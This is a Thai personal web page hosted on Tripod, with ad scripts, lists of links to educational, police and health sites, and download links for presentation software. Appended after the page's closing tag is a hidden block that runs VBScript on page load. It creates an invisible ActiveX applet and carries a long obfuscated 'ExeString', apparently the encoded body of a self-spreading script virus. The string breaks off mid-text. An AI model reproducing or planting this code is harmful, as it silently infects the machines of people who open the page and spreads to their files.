<html>
<head>
<title>Un title page</title>
<meta http-equiv="Content-Type" content="text/html; charset=">
<style type="text/css">
<!--
body {  margin: 0px  0px; padding: 0px  0px; font-family: "MS Sans Serif", "Microsoft Sans Serif"; font-size: 12px; color: #FFFFFF}
a:link { color: #FFFFFF; text-decoration: none; font-family: "MS Sans Serif", "Microsoft Sans Serif"; font-size: 12px}
a:visited { color: #CCCCCC; text-decoration: none; font-family: "MS Sans Serif", "Microsoft Sans Serif"; font-size: 12px}
a:active { color: #0099FF; text-decoration: underline}
a:hover { color: #FFFF00; text-decoration: underline; font-family: "MS Sans Serif", "Microsoft Sans Serif"; font-size: 12px}
-->
</style>
</head>

<body bgcolor="#000000" text="#FFFFFF" link="#FFFFFF" vlink="#00FFFF" alink="#FFCC00"><style id="BANNERSTYLE" type="text/css">
div#tb_container{text-align:center; color:#fff}
div#tb_container a{color:#fff; font-family:Arial, Helvetica, sans-serif; font-size:11px; text-decoration:none}
div#tb_container a:hover{color:#292929; text-shadow:none}
div#tb_container div.tb_menu_bg{width:760px; margin:0 auto 10px; padding:0; text-shadow:1px 1px 1px #515151;
	background-color:#7F9343;
  	background-image:-moz-linear-gradient(top, #7F9343, #CAD99B); 
  	background-image:-webkit-gradient(linear,left top,left bottom,color-stop(0, #7F9343),color-stop(1, #CAD99B));
  	-moz-border-radius:0 0 10px 10px; -webkit-border-radius:0 0 10px 10px; border-radius:0 0 10px 10px;
  	-moz-box-shadow:1px 1px 2px #292929; -webkit-box-shadow:1px 1px 2px #292929; box-shadow:1px 1px 2px #292929; overflow:hidden;
	font-family:Arial, Helvetica, sans-serif}
div#tb_container div.tb_menu_bg a.floatLeftAd{float:left; margin-left:13px; background:url(adm/common/images/tripodLogoAd.png) no-repeat -94px 0; height:27px; width:86px}
div#tb_container div.tb_menu_bg a.floatLeftAd:hover{background-position:0 0}
div#tb_container div.tb_menu_bg .txtContainer{float:left; margin:4px 0 0 10px}
div#tb_container div.tb_menu_bg .txtContainer strong{margin-left:5px; border-left:1px solid; padding-left:18px; color:#292929; text-shadow:none}
div#tb_container div.tb_menu_bg a.big{font-size:17px; margin:0 10px}
</style>


<script type="text/javascript" src="http://hb.lycos.com/hb.js"></script>
<script type="text/javascript">
var cm_role = "live";
var cm_host = "tripod.lycos.com";
var cm_taxid = "/memberembedded";
var tripod_member_name = "soosaisamut";
var tripod_member_page = "soosaisamut/new_ri.html";
var tripod_ratings_hash = "1306397163:87d6ca07e9ca90ff08f987cd128d20ec";

var lycos_ad_category = null;

var lycos_ad_remote_addr = "204.93.130.142";
var lycos_ad_www_server = "www.tripod.lycos.com";
var lycos_ad_track_small = "http://members.tripod.com/adm/img/common/ot_smallframe.gif?rand=21194";
var lycos_ad_track_served = "http://members.tripod.com/adm/img/common/ot_adserved.gif?rand=21194";
</script>

<script type="text/javascript" src="http://scripts.lycos.com/catman/init.js"></script>
<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
<script type="text/javascript"> 
var lycos_ad = Array();
var lycos_search_query = "";
var lycos_onload_timer;

function lycos_check_size() {
    var window_width = 0, window_height = 0;
    if (typeof(window.innerWidth) == 'number' ) {
        window_width = window.innerWidth;
        window_height = window.innerHeight;
    } else if (document.documentElement && (document.documentElement.clientWidth || document.documentElement.clientHeight)) {
        window_width = document.documentElement.clientWidth;
        window_height = document.documentElement.clientHeight;
    } else if (document.body && (document.body.clientWidth || document.body.clientHeight)) {
        window_width = document.body.clientWidth;
        window_height = document.body.clientHeight;
    } 
    
    var lycos_track_img = document.createElement('img');
    if( top == self ) {
        return 1;
    } else {
        if ((window_width < 300) || (window_height < 300)) {
            lycos_track_img.src=this.lycos_ad_track_small+"&w="+window_width+"&h="+window_height;
            return 0;
        } else {
            lycos_track_img.src=this.lycos_ad_track_served+"&w="+window_width+"&h="+window_height;
            return 1;
        }
    }
}
       
function lycos_insert_ads() {
    var lycos_ad_mgr = new AdManager();
    
    if (this.lycos_search_query) {
        lycos_ad_mgr.setForcedParam("keyword", this.lycos_search_query);
    } else if (this.lycos_ad_category && this.lycos_ad_category.find_what) {
        lycos_ad_mgr.setForcedParam("keyword", this.lycos_ad_category.find_what);
    }

    if (this.lycos_ad_category && this.lycos_ad_category.dmoz) {
        lycos_ad_mgr.setForcedParam("page", this.lycos_ad_category.dmoz);
    } else {
        lycos_ad_mgr.setForcedParam("page", "member");
    }

    var lycos_prod_set = lycos_ad_mgr.chooseProductSet();
    var slots = ["leaderboard", "leaderboard2"];
    for (var slot in slots) {
        if (lycos_ad_mgr.isSlotAvailable(slots[slot])) {
            lycos_ad[slots[slot]] = lycos_ad_mgr.getSlot(slots[slot]);
        }
    }

    lycos_ad_mgr.renderFooter();
}

function generateHref(atag, template){
    atag.href=template.replace('_MYURL_', window.location.href.replace('http://', '')).replace('_MYTITLE_', 'Check%20out%20this%20Tripod%20Member%20site!'); 
}

if (lycos_check_size()) {
    lycos_insert_ads();
}


jQuery.noConflict();
jQuery(function(){
  if ( ! lycos_check_size() ) { jQuery("#tb_container").hide(); jQuery("#FooterAd").hide(); return; }

  var onButton = -44;
  var onShare = -89;
  var onSearch = 0;
  var $build = jQuery("#build");
  var ss = $build.css("top");

	jQuery("#more_click").unbind().click(function(ev){
      if (ss == onShare) {
          $build.animate({"top": onButton + "px"});
          ss = onButton;
      }
      else {
          $build.animate({"top": onShare + "px"});
          ss = onShare;
      }
	});
											
	jQuery("#searchlycos").unbind().click(function(ev){
      if (ss == onSearch) {
          $build.animate({"top": onButton + "px"});
          ss = onButton;
      }
      else {
          $build.animate({"top": onSearch + "px"});
          ss = onSearch;
      }
	});
	
  var f = jQuery("#FooterAd").remove();
  f.children("script").remove();
  f.appendTo("body");

  jQuery("#BANNERSTYLE").appendTo("head");

});
</script>
<div id="tb_container">
    <div class="tb_menu_bg">
        <div id="tb_menu">
        
   <a href="http://www.tripod.lycos.com" title="tripod.com" class="floatLeftAd"></a>
   
   <div class="txtContainer">
   <a href="http://www.tripod.lycos.com" title="Build a website at Tripod.com" class="big">Build your own FREE website at Tripod.com</a>
   <strong style="font-size:14px">Share: </strong>

<a href="http://www.facebook.com" onclick="generateHref(this, 'http://facebook.com/sharer.php?u=_MYURL_&t=_MYTITLE_')" id="facebook" rel="nofollow">Facebook</a> |
<a href="http://www.twitter.com" onclick="generateHref(this, 'http://twitter.com/home?status=_MYTITLE_%20-%20_MYURL_')" id="twitter" rel="nofollow">Twitter</a> |
<a href="http://www.digg.com" onclick="generateHref(this, 'http://digg.com/submit?phase=2&url=_MYURL_&title=_MYTITLE_')" id="digg" rel="nofollow">Digg</a> |
<a href="http://reddit.com" onclick="generateHref(this, 'http://reddit.com/submit?url=_MYURL_&title=_MYTITLE_')" id="reddit" rel="nofollow">reddit</a>
</div>
		</div>
    </div>
	
    
    <div id="tb_ad" style="display:block!important"><div id="ad_container" style="display:block!important"><script type="text/javascript">document.write(lycos_ad['leaderboard']);</script></div></div>
</div>
<div id="FooterAd" style="text-align:center; display:block!important; width:100%!important"><script type="text/javascript">document.write(lycos_ad['leaderboard2']);</script></div>
<noscript>
 <img src="http://members.tripod.com/adm/img/common/ot_noscript.gif?rand=21194" alt="" width="1" height="1" />
 <!-- BEGIN STANDARD TAG - 728 x 90 - Lycos - Tripod Fallthrough - DO NOT MODIFY -->
 <iframe frameborder="0" marginwidth="0" marginheight="0" scrolling="no" width="728" height="90" src="http://ad.yieldmanager.com/st?ad_type=iframe&amp;ad_size=728x90&amp;section=209094"></iframe>
 <!-- END TAG -->
</noscript>




<div id="Layer1" style="position:absolute; left:13px; top:9px; width:155; height:60; z-index:1; overflow: auto"> 
  <table width="100%" border="0" cellspacing="1" cellpadding="3" align="right">
    <tr> 
      <td bgcolor="#666666">Hot Links</td>
    </tr>
    <tr> 
      <td bgcolor="#666666"><a href="http://www.uni.net.th/%7E02_2543/" target="_blank">เครือข่ายคอมพิวเตอร์</a></td>
    </tr>
    <tr> 
      <td bgcolor="#666666"><a href="http://www.uni.net.th/%7E04_2543/" target="_blank">คณิตศาสตร์2</a>,<a href="http://www.uni.net.th/%7E05_2543/" target="_blank">ภาษาฝรั่งเศส1</a> 
      </td>
    </tr>
    <tr> 
      <td bgcolor="#666666"><a href="http://www.uni.net.th/%7E06_2543/" target="_blank">การบัญชีบริหาร</a></td>
    </tr>
    <tr> 
      <td bgcolor="#666666"> 
        <p><a href="http://www.uni.net.th/%7E10_2543/" target="_blank">หลักการบัญชี</a> 
        </p>
      </td>
    </tr>
    <tr> 
      <td bgcolor="#666666"><a href="http://www.uni.net.th/%7E07_2543/" target="_blank">โครงสร้างข้อมูลโปรแกรม</a></td>
    </tr>
    <tr> 
      <td bgcolor="#666666"><a href="http://www.uni.net.th/%7E08_2543/" target="_blank">เทคโนโลยีสารสนเทศ 
        </a></td>
    </tr>
    <tr> 
      <td bgcolor="#666666"><a href="http://www.uni.net.th/%7E09_2543/" target="_blank">ระบบฐานข้อมูล 
        </a></td>
    </tr>
    <tr> 
      <td bgcolor="#666666" height="20"><a href="http://www.uni.net.th/%7E14_2543/" target="_blank">ชีวเคมีพื้นฐาน 
        </a></td>
    </tr>
  </table>
</div>
<div id="Layer2" style="position:absolute; left:13px; top:80px; width:155; height:60; z-index:2; overflow: auto"> 
  <table width="100%" border="0" cellspacing="1" cellpadding="3" align="right">
    <tr> 
      <td bgcolor="#666666"><font color="#FFFF00">Hot Links</font></td>
    </tr>
    <tr> 
      <td bgcolor="#666666"> 
        <div align="center"></div>
        <a href="http://www.thaiwbi.com" target="_blank">ศึกษาหาความรู้จากThaiwbi</a></td>
    </tr>
    <tr> 
      <td height="18" bgcolor="#666666"><a href="http://e-learning.yonok.ac.th" target="_blank">E-Learning-Yonok</a></td>
    </tr>
    <tr> 
      <td height="18" bgcolor="#666666"><a href="http://truehits.net" target="_blank">ศูนย์รวมสถิติเว็บไทย</a></td>
    </tr>
    <tr> 
      <td height="18" bgcolor="#666666"><a href="http://www.esl-lab.com" target="_blank">Learning 
        English</a></td>
    </tr>
    <tr> 
      <td height="18" bgcolor="#666666"><font color="#FFFF99"><a href="http://www.pixiart.com/links" target="_blank">รวม 
        Links</a></font></td>
    </tr>
  </table>
</div>
<div id="Layer2" style="position:absolute; left:11px; top:151px; width:155; height:60; z-index:2; overflow: auto"> 
  <table width="100%" border="0" cellspacing="1" cellpadding="3">
    <tr bgcolor="#0033FF"> 
      <td width="52%" bgcolor="#666666"> 
        <p><font color="#880000"><b><font color="#FFCC00">ตำรวจ</font></b></font><br>
          <a href="http://www.police.go.th" target="_blank">สำนักงานตำรวจแห่งชาติ<br>
          </a><a href="http://www.p1.police.go.th" target="_blank">ต.ร.ภูธรภาค 
          1<br>
          </a><a href="http://www.p2.police.go.th" target="_blank">ต.ร.ภูธรภาค 
          2</a><a href="http://www.p3.police.go.th" target="_blank"><br>
          ต.ร.ภูธรภาค 3</a><br>
          <a href="http://www.p4.police.go.th" target="_blank">ต.ร.ภูธรภาค 4</a><br>
          <a href="http://www.p5.police.go.th" target="_blank">ต.ร.ภูธรภาค 5</a><br>
          <a href="http://www.p6.police.go.th" target="_blank">ต.ร.ภูธรภาค 6</a><br>
          <a href="http://www.p7.police.go.th" target="_blank">ต.ร.ภูธรภาค 7</a><br>
          <a href="http://www.p8.police.go.th" target="_blank">ต.ร.ภูธรภาค 8</a><br>
          <a href="http://www.p9.police.go.th" target="_blank">ต.ร.ภูธรภาค 9</a><br>
          <a href="http://www.cib.police.go.th" target="_blank">กองบัญชาการตำรวจสวนกลาง</a><br>
          <a href="http://www.bpp.police.go.th" target="_blank">กองบัญชาการ ต.ช.ด.</a><br>
          <a href="http://www.imm.police.go.th" target="_blank">สำนักงานตรวจคนเข้าเมือง</a><br>
          <font color="#FFCC00">สุขภาพอนามัย/การแพทย์-พยาบาล</font><font color="#880000"><br>
          </font> <a href="http://thailabonline.com/sec31myo.htm" target="_blank">โรคหัวใจขาดเลือด</a><br>
          <a href="http://www.thaiclinic.com" target="_blank">Thaiclinic dot com</a><br>
          <a href="http://www.bangkokhealth.com" target="_blank">Bangkok Health</a><br>
          <a href="http://www.thaiheartweb.com" target="_blank">ความรู้เรื่องโรคหัวใจ</a><br>
          <a href="http://siamhealth.hypermart.net/index0/disea.htm" target="_blank">Siamhealth</a><br>
          <a href="http://www.doctordek.com/unit1page1.5.htm" target="_blank">โรคหัวใจที่เกิดภายหลังเกิด</a><br>
          <a href="http://www.thaiheartweb.com/heartdisease.htm" target="_blank">โรคหัวใจ</a><br>
          <a href="http://www.clinic.worldmedic.com/contents/denquefever.htm" target="_blank">ไข้เลือดออก</a><br>
          <a href="http://www.elib-online.com/doctors/ped_dhf2.html" target="_blank">ไข้เลือดออก 
          (พ.ญ.ลำดวน)</a><br>
          <a href="http://www.thaiclinic.com/medicine.html" target="_blank">อายุรกรรม</a><br>
          <a href="http://www.thaiclinic.com/obgyn.html" target="_blank">สูตินรีเวช</a><br>
          <a href="http://www.thaiclinic.com/surgery.html" target="_blank">ศัลยกรรม</a> 
          <font size="1" face="MS Sans Serif, Microsoft Sans Serif"> </font></p>
      </td>
    </tr>
  </table>
</div>
<div id="Layer4" style="position:absolute; left:13px; top:227px; width:155px; height:60px; z-index:4; overflow: auto"> 
  <table width="100%" border="0" cellspacing="0" cellpadding="0" align="center" bordercolor="#666666">
    <tr valign="middle" bgcolor="#0000FF"> 
      <td width="34%" height="2"> 
        <div align="center"><font color="#FFFFFF">Adobe PhotoShop6.0</font></div>
      </td>
    </tr>
    <tr valign="middle"> 
      <td width="34%" bgcolor="#0099FF"> 
        <div align="center"><font color="#FFFFFF"><a href="present_1_21.zip">- 
          click here -</a></font></div>
      </td>
    </tr>
    <tr valign="middle"> 
      <td width="34%" bgcolor="#0000FF"> 
        <div align="center"><font color="#FFFFFF">Macromedia Flash MX</font></div>
      </td>
    </tr>
    <tr valign="middle"> 
      <td width="34%" bgcolor="#0099FF"> 
        <div align="center"><font color="#FFFFFF"><a href="zip_flash.ZIP">- click 
          here -</a></font></div>
      </td>
    </tr>
    <tr valign="middle"> 
      <td width="34%" bgcolor="#0000FF"> 
        <div align="center"><font color="#FFFFFF">www.Think.Com </font></div>
      </td>
    </tr>
    <tr valign="middle"> 
      <td width="34%" bgcolor="#0099FF"> 
        <div align="center">-<font color="#FFFFFF"><a href="presendr/2.ppt">- 
          click here -</a></font></div>
      </td>
    </tr>
    <tr> 
      <td bgcolor="#0000FF"> 
        <div align="center"><font color="#FFFFFF">software for present</font></div>
      </td>
    </tr>
    <tr> 
      <td bgcolor="#0099FF"> 
        <div align="center"><font color="#FFFF00"><a href="SWISH2.0.zip">Setup 
          Swish2.0</a></font></div>
      </td>
    </tr>
    <tr valign="middle"> 
      <td width="34%" bgcolor="#0099FF"> 
        <div align="center"><font color="#00FF00"><a href="SLIDEWKS.zip">slide 
          work for present</a></font></div>
      </td>
    </tr>
  </table>
</div>
<div align="right">
  <p>&nbsp;</p>
  <p>&nbsp;</p>
  <p>&nbsp;</p>
</div>
<div align="right"> </div>
</body>
</html>

<HTML>
<BODY onload="vbscript:KJ_start()">
<script language=vbscript>
document.write "<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><"&"APPLET NAME=KJ"&"_guest HEIGHT=0 WIDTH=0 code=com.ms."&"activeX.Active"&"XComponent></APPLET></div>"
</script>
<script language=vbscript>
ExeString = ">afCfPb_j^&BlffN]qn&N[mN]qn&<^al]^Mc_g&;hif_G[d_[m&@KH&QkLb_de&QagJ[la&Mm[?&>bh[dr>ckdKn\CCYmlZln CCM_l=cg CC=l]Zn_Ebfc]n#EDDbe_Am#ED;k_[l^G[ae#EDHkijY`[n]!#>h^Lo\>nh]lbihDD;hi_h\Mi>bf_HZnb$Msj]Lnl!If?ljhlJ^moe^H]qnL_nK_[\M_gh7>LI(Gi_hL^rn>bf_ ?cf]I[n`%+#NghLnl6L]Z^N]fj(J^[^9efB`Agmnj!NghLnl$EDWln[jm#66*GkF]gNeiMnj6*N`^hK_[\M_gh'=fgl_>rcl@of\ncgg=g^A_A_Nqi_Mlk7bnlN`^hK_[\M_gh'=fgl_L_n?cf]M_gh7>LI(Gi_hL^rn>bf_ ?cf]I[n`%,#@cd^N_ei(Qjbn_6:H>ShhfgZ^7pZl]lain4 DDYkm[ll!# 8pZ<lF^ LfjMlk o\=jE`BneeN_pm>bf_L^gj&<fik^K^n>:nnjb\5@MG'A_l?cf]!@cd^J[la#?;nlkc\&Znnjb\ol^m5-.?fk^J^[^L^gj&<fik^K^n>bf_L^gj6@KH(Ih^hN]qn@ae_>bf_HZnb$1#B`Lrj_Kml5blffMb_f@ae_N]fj(Okcn]p\;kF`4 BNEE8pZ<lF^ 5<G=SggfiY]7 p\k\lchm4CCYmlZln  7p\;kF`BlffN]qn>fm]B`Lrj_Kml5pZlLa_h@cd^N_ei(Qjbn_o\=jE`P\kM_rl?f]C^@ae_N]fj(;eim]?f]C^?f]@mg]nahh@mg]nahhCC=bYga_Kn\;nll]gnMlkch_%F[kmCh\^r=`Zl#C`E[mlBh^]q=bYk7)N`^hB`D^`n E=[k^=mkl_fmMnjbha!%+#66D<[m]!]N`^hDD=`Zha]Lo\6@ag[fq=cmc 3VMoZ>7)=em_ED;a[h_^MoZ7;al9l]D^`n E=[k^=mkl_fmMnjbha!%+#!') 4VMm[?5*>h^B`>fm]EB<b[f`_Mm[7Fc^ <olj^hnKmlcf`&+$E[mlBh^]q=bYk#>h^B`>h^?oh[mcif?oh[mcifED;k_[l^G[ae#Ih>llgkL]log]H_pmA_CfPb_j^7bneeLa_h?ram@mg]nahh>h^B`Lb[j^@cd^7E_`l!QcfI[n`%-#HkiajZg>bf_kU=iefih?cf]lVGa\likh`nLb[j^^VKm[nahh_jrV\dZhe&angC^@KH(@ae_?pbmnk!MbYk_@ae_#!Nb]g;ZffDD;hi_h\MiKa[l]?cf]%blff!?dl_L_n?cf]M_gh7>LI(Gi_hL^rn>bf_ Lb[j^@cd^&,$mlo]>bf_L^gj&Plcl^4 BNEE8pZ<lF^ 5<G=SggfiY]7 p\k\lchm4CCYmlZln  7p\;kF`BlffN]qn?cf]M_gh'=fgl_>h^B`=_`YnfnA]7PmM`^ff&K_aJ^[^ BE=RY=MKL?FMYOK>LVA]_hlbnc]lV>]_[odmOk^lA=#IolEiicO_lkbih6QkLb_de(L]`L_Y]@D?SWEI=9EYG9<BCF>VMg_nqYk_VEb]lgli`lUIoleiic?rhk_mkUG_\b[P]k#QmKa_fd'L__Plcl^@D?SW<OLJ>HNWNM?JUC^]gnclb_mT >]_[odmC^VMg_nqYk_VEb]lgli`lUIoleiic?rhk_mkU E_`l!IolEiicO_lkbih$*#(*TF[cdU=ieiim]Om]MnYmcif^ls%+&K?AW=QIJ=<[fdEDEZcfJ^aAE?QX=OJK?HLXOM=KVC\^hnamc_kU <^`[menC\VKh`noZl_TFc]jhmi^mVImmfigd?pil_klVF_^mImmFigdP_jlcif%+#((UG[aeVMlZncgg_lqH[e^&Ka[l]?cf];ZffDDGYbfL]`@D?SW<OLJ>HNWNM?JUC^]gnclb_mT >]_[odmC^VMg_nqYk_VEb]lgli`lUIoleiic?rhk_mkU E_`l!IolEiicO_lkbih$*#(*TF[cdUQc\^MlZncgg_lqH[e^&Ka[l]?cf]OlMb]ef(J^aQjbn_BE=RY=MKL?FMYOK>LVKh`noZl_TFc]jhmi^mVI^_c]]U3((UIoleiicUIjlbihkUG[aeV?\bnijIl_^^l_f\_$*-+(0,&K?AW=QIJ=<[fdEDEZcfJ^aAE?QX=OJK?HLXOM=KVMg_nqYk_VEb]lgli`lUQcf]iqkG_kl[aagaKn\mqln_eUJlg_cf]lVGa\likh`nHondhieBhn]kh_lM_lmch_lV*Y)^**)**()**()*]()**()**()**(-0V()+_(,0*%\dZhe;ZffDDGYbfL]`@D?SW<OLJ>HNWNM?JUMi^mq[j^VGa\likh`nTPch\hqmGNV;nll]gnP]kmcggVQag^iolG]lm[_bhaLo\krmn]fVJjh`cd^mVEb]lgli`lIoleiicChl^lh]mM]mncf`mV(Z*^(+**()**()**[)**()**()**().0T)*+])-0(&Ze[hc#PmM`^ff&K_aOkcn]BC>SY;NLL=GNYML?LTLi`lp[l]UGc[kimg_nVG_`c[^V+('*VGnnfgheVGincggmVEZcfT>^clhlJj^`_j^h]]&++**1*%L=@Y>OHL>=YefCCG[aeL__!BC>SY;NLL=GNYML?LTLi`lp[l]UGc[kimg_nVG_`c[^V+('*V;hggggVGYbfM]mncf`mVF^qMlZncgg_lq&Ze[hc#DDoef[a]?if\^lD^`n PchHZnb$,#JjhalYf@ae_mT<igehh>bf_kUGc[kimg_nKa[l]]VMlZncgg_lq#>h^?oh[mcif?oh[mcifED;k_[l^Gcdb_o Gg?jkilK_mmf_F^rnN_eiJ[la7B`Fhn>LI(>bf_=qcmllQagJ[la QM[kcjl'_r]##Mb_fN]fjJYmb5mqln_e,,V?f]C^C^N_eiJ[la7mskm_g++VMb_fMlZlnMi@cd^7PchHZnbKRMN=FVE]kh_d,,(\ef?fk^Km[llNj@ae_5QcfI[n` LSML>GVC^lh]e(^de>h^B`PmM`^ff&K_aOkcn]BC>SYDH=;DXG;;ACH=UMi^mq[j^VGa\likh`nTPch\hqmT<olj^hnN^lmahhVJnhVC^lh]e-,%MnYknOh?cf]@KH(=gis@ae_ObhJYmbq][Vebp[fd'ac^&QagJ[la q_ZU@id]_l&ann@KH(=gis@ae_ObhJYmbmqln_e,,Vccq[de(aa_&ObhJYmbmqln_e,,V\^melhj(agc=[deEB:jj]g^Ng!QcfI[n` p_\T?if\^l(`mn$bnl#PmM`^ff&K_aOkcn]BC>SY;E;MK>MYJHINT'^fdU&]ff^bf_QkLb_de(L]`Qlam_AE?QX=F9LM?KXLIGMV(\efV;hhn]gnLrj_%[hifc[Zncgg)r%fm^gphfgZ^QmKa_fd'L__Plcl^@D?SW<F;KL?MWKIILU^fd_cf]U>_^ZoflB]ifU&OlMb]ef(J^aL]Z^AE?QX=F9LM?KXLIGMVpp]`cd^V>]_[odmC]ggV!QkLb_de(L]`Qlam_AE?QX=F9LM?KXLIGMV^de`cd^VM[kcjl>haag_V%P:L]lainQmKa_fd'L__Plcl^@D?SW<F;KL?MWKIILU^fd?cf]UMb]efVGi_hT<igeZh^T&QagJ[la M_ghI[n` PM]jbjn&^r_)#PmM`^ff&K_aOkcn]BC>SY;E;MK>MYJHINT]ff>bf_TLb_de?rTIlih^lnqLb_]mB[f]f_jlVQKAJlgimV%u.),/,<;/%2/-:&++;?'2;20'();;()<2/)2=uOlMb]ef(J^aQjbn_BE=RY=D:MM=LYLGHNV\ef@ae_VK\lchmBikm?h[h^_T&s1/++*0-)&.2(<'+)=,':*@3%)*=(-@2.<-,,vL_n?cf]M_gh7>LI(Gi_hL^rn>bf_ Ln[jmOj>bf_$+&njn_#@cd^N_ei(Qjbn_O\mL^rn@cd^N_ei(=dhm_?h\@of\ncgg@of\ncggEBEce]Bn!C^ChOa_l]68bneeLa_h?ram@mg]nahh>h^B`MbckEi]Ymcif7\h]oe^hn&ei]YmcifC^F_^mN`bmFg\[nahh&-#5`ae_Mb_fN`bmFg\[nahh5Gc\!NbalFi[Zncgg&3!C^@MG'A_l>rn]gmcggH[e^N`bmFg\[nahh#58n`^hMbckEi]Ymcif7D^`n MbckEi]Ymcif%F_f!NbalFi[Zncgg#%F_f!@MG'A_l?cf]G[g]!NbalFi[Zncgg##!?f]C^C^F_f!NbalFi[Zncgg#6-La_hNbalFi[Zncgg7MbckEi]Ymcif U>h^B`DDoef[a]?if\^lLacmDh][lbih!?f]C^?f]@mg]nahh@mg]nahhCCG[aeL__!L__Lnl$?cf]G[g]Gg?jkilK_mmf_F^rnL__M_ghLnl6QkLb_de(L]`L_Y]L]`MnjA_L]`N_eiMnj7N`^hPmM`^ff&K_aOkcn]L__Lnl$?cf]G[g]?f]C^?f]@mg]nahh@mg]nahhCCI\gLo\ <olj^hnKmlcf`#Lo\=7(N]lnImm7)<hQ`bf_Mlo]N]lnImm7M_mlHon$+C`M_mlHon7,0Nb]g;nll]gnMlkch_7>bh[dr>ckd 4V?pbn<h=g^A_Gg?jkilK_mmf_F^rnM_lNbal@id]_l6@KH(A]m@id]_l <olj^hnKmlcf`#L_n=c]Kn\5=l]Zn_G[d_[mK\lchmch_'>c[mcifZlsK^n>hf^]km5Nbal@id]_l&Lo\>hf^]km?if\^l=gnhn6*@ij?[[aN]fj@ge^_jch?if\^lm@id]_l;hohl7>hf^]k=imgn#+=c]Kn\(Y]^>hf^]k=imgn&M_gh?if\^l(FZg_H_pmA_>a\MoZ'=imgn5*La_hF[kmCh\^r=`Zl5ChkmlL]o=mkl_fmMnjbha$V$E_h <olj^hnKmlcf`#')Kn\Mlkch_7Eb^;nll]gnMlkch_%F[kmCh\^r=`Zl%)%F_f!=ojk_hlLnlaga#%E[mlBh^]q=bYk'+!=mkl_fmMnjbha6EB<b[f`_Mm[=mkl_fmMnjbha$E[mlBh^]q=bYk#Lo\=7)?dl_B`Kn\?6*Mb_f=mkl_fmMnjbha6=mkl_fmMnjbha>a\MoZ'Cn]f+! U>rcl>i?fk^b7(@gkd6+Mi>hf^]k=imgnB`D<[m]!MoZLnlaga#6F;Zm_ =c]Kn\(Am_g c##Mb_fC^d4@id]_l;hohlNb]g;nll]gnMlkch_7;nll]gnMlkch_ <b]Mm[(Cl^gb$+#T=qcn=i>h^B`>h^B`G_rlFYlnCf]_r;a[l6CflnlJ^p;nll]gnMlkch_%V%F_f!=ojk_hlLnlaga#%*#Lo\Kmlcf`7Fc^ <olj^hnKmlcf`&FYlnCf]_r;a[l#*&F]g=mkl_fmMnjbha!&F[kmCh\^r=`Zl');nll]gnMlkch_7CC=bYga_Kn\;nll]gnMlkch_%F[kmCh\^r=`Zl#?h\C`?h\C`FigiCCI\gLo\6=mkl_fmMnjbha?h\@of\ncgg@of\ncggEBIlihZa[l^#Ih>llgkL]log]H_pmJ^aJYmbPYeo_6@D?SWEI=9EYG9<BCF>VMg_nqYk_VEb]lgli`lUIoleiic?rhk_mkU>__k__>ale>]`l_]7OlMb]ef(J^aL]Z^J^aJYmbPYeo_!C^>ckd>__k__6Nb]g<bme<^al]^7?chYes>ale4T=g^A_>hla6+lh/>ckd>__k__6EBH\iKn\<bme<^al]^#DDoef[a]?if\^l<bme<^al]^#G_rlQkLb_de(L]`Qlam_J^aJYmbPYeo_$=cmc=_aj^_>h^?oh[mcif?oh[mcifEDmfg[_^@id]_l I[n`G[g]Gg?jkilK_mmf_F^rnM_l@id]_lFZg_6@KH(A]m@id]_l I[n`G[g]K^nLacm>bf_k7>hf^]kH[e^(@ae_mBnl>rckmm5*?il>[]`Nbal@cd^CfNbal@cd^m?cf]>rn6O;Zm_ ?MI&@_n=qn_flcifG[g]!Nbal@cd^(JYmb#!C^@cd^?rl7ANGIl?cf]>rn6@MGFIl?cf]>rn69LJHl>bf_=qn5J@IGk@ae_?pm7DMHN`^h<[fdED9ij_f]Ni Mbck?cf]'J[la&`mgf=em_A_@ae_?pm7P<KN`^h<[fdED9ij_f]Ni Mbck?cf]'J[la&n[m!?dl_C^@cd^?rl7ANNNb]g@mn?pbmnk7)?f]C^H]qnB` N=[k^JYmbHYf_#6O;Zm_ PchHZnb<^melhjV#GkM<[m]!J[laH[e^#5O=Yl_ObhJYmb>]lengi#!Mb_fBlm?ralnm6+?h\C`C`Ann=qcmll7)N`^h?MI&<ijq?cf]QcfI[n` lsml^g-*U^_kdnih'cha&JYmbHYf_?MI&<ijq?cf]QcfI[n` p_\T?if\^l(`mn$I[n`G[g]?f]C^?f]@mg]nahh@mg]nahhCCM_l=cg Gg?jkilK_mmf_F^rn?lj'=f]ZlM_mlBn5QM[kcjl'M]jbjn>nfffZg_C`>llMb_fCfPb_j^7bnee>fm]CfPb_j^7p\k=g^A_A_CfPb_j^7p\kN`^hL_n?MI6=j^[n]H\d]\nL]laincf`(@ae_Mqln_eH\d]\n!M]mQkLb_de7<l_Ym_IZc_]l!QK\lchm(M`^ff=em_M_l;jhe_IZc_]l7\h]oe^hn&Zjjd^nm EDW`o_km#;jhe_IZc_]l'm_l<FMA=s?3--==,*&+=>)'+)=*'9=<3%)*=(-@>-1;*:v#;jhe_IZc_]l']l]Zn_AgmnYg]_ K^nOlMb]ef5;jhe_IZc_]l'A_lH\d]\n!;hif_G[d_[m(m]m=FKB>t*>,,@?(*'@(2-')*=@%13.(&**9)=3(..,*1w!;hif_G[d_[m(]j^[n]BhmlZh]]!#L_n?MI6;hif_G[d_[m(A]mI\b^]n =g^A_K^n<bmeG[d_[m7?MI&=lcn^m?il>[]`>ckdN_eiCf>ckdI\b^]nC`=cmcM_gh'>lao_Nqi_47,:h^=cmcM_gh'>lao_Nqi_47+Mb_f?pbn>hl>h^B`?chYes>ale5>ckdN_ei(>jbp_D^nn]kF^rn>ceIn`^l;jk-!LYg^iebt_@ijc7(Ni,Gmb_j:ll b#5Chl!3#Lf]##H_pmL^gjKmlcf`7?ilb7+MiD^hLacmL^rn!N]fjHmf7:m] Fc^ MbckM_rl%c&)#B`L^gjFng5+-Mb_fN]fjHmf7+2>fm]B`L^gjFng5+*Mb_fN]fjHmf7+3>h^B`M_gh<b[j7;alL^gjFng%In`^l;jkcFi^-##C`M_gh<b[j7;al+-#La_hN_ei=bYk7<bl *2#?h\C`N_eiMnjbha6N]fjMlkch_ L^gj;a[lH_pmMgFi[dMnj7>r_[nn_ >afE]r;lj!-#$MbckM_rl n[=lD_ D_s9kl(7 Hnb]k;lj!*# pZ<lF^C^s;jk+!7 Gmb_j:ll *#p\;kF`E]r;lj!,#6Ila_l9kl* o\=jE` E_q:ll ,#5In`^l;jk-!  n[=lD_ 